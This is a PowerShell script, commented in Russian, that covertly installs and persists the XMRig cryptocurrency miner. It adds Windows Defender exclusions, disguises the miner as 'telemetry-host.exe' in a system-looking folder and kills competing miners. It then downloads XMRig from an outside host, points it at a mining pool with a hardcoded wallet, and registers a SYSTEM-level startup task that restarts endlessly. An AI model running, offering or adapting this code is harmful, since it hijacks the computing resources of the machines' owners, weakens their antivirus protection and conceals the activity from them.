# === НАСТРОЙКИ ===
$Coin = "USDT"
$Wallet = "0xbD4a36e73BDa8B0f50689d60528c698FA05b6005"
$RefCode = "rbi3-l12f"
$Pool = "rx.unmineable.com:3333"
$MaxCpuUsage = 60                      # % CPU
$InstallDir = "C:\ProgramData\SysWorker"
$TaskName = "telemetry-host"
$ExeFileName = "telemetry-host.exe"
# =================

$ErrorActionPreference = "Stop"
$WorkerName = ($env:COMPUTERNAME -replace '[^a-zA-Z0-9_-]', '')
$TargetExePath = "$InstallDir\$ExeFileName"

if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# 1. Исключение в Windows Defender ДО скачивания (и для директории, и для бинарника)
try {
    Add-MpPreference -ExclusionPath $InstallDir, $TargetExePath -ErrorAction SilentlyContinue
} catch {}

# 2. Останавливаем старую задачу и старые процессы перед обновлением
try {
    Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    Stop-ScheduledTask -TaskName "SysBackgroundWorker" -ErrorAction SilentlyContinue
} catch {}

Get-Process -Name "telemetry-host", "xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

# 3. Скачиваем и распаковываем XMRig для Windows x64
$XmrigVer = "6.22.2"
$ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v$XmrigVer/xmrig-$XmrigVer-msvc-win64.zip"
$ZipPath = "$InstallDir\xmrig.zip"
$TmpDir = "$InstallDir\tmp"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath
Expand-Archive -Path $ZipPath -DestinationPath $TmpDir -Force

$ExtractedExe = Get-ChildItem -Path $TmpDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
if (-not $ExtractedExe) {
    throw "Не найден xmrig.exe после распаковки архива."
}

Move-Item -Path $ExtractedExe.FullName -Destination $TargetExePath -Force
Remove-Item -Path $TmpDir, $ZipPath -Recurse -Force

$UserString = "$Coin`:$Wallet.$WorkerName"
if ($RefCode -ne "") {
    $UserString = "$UserString#$RefCode"
}

$JsonConfig = @"
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "max-threads-hint": $MaxCpuUsage,
        "priority": 1
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "$Pool",
            "user": "$UserString",
            "pass": "x",
            "keepalive": true,
            "tls": false
        }
    ]
}
"@

$Utf8NoBom = New-Object System.Text.UTF8Encoding($false)
[System.IO.File]::WriteAllText("$InstallDir\config.json", $JsonConfig, $Utf8NoBom)

# 5. Регистрируем и запускаем фоновую задачу telemetry-host
$Action = New-ScheduledTaskAction -Execute $TargetExePath -Argument "-c config.json" -WorkingDirectory $InstallDir
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 0) -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)

Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
Start-ScheduledTask -TaskName $TaskName
Start-Sleep -Seconds 3

Write-Host "Готово. Воркер $WorkerName запущен через задачу $TaskName." -ForegroundColor Green
Get-Process -Name "telemetry-host" -ErrorAction SilentlyContinue | Select-Object Id, ProcessName, CPU
Get-ScheduledTask -TaskName $TaskName | Get-ScheduledTaskInfo
Exit
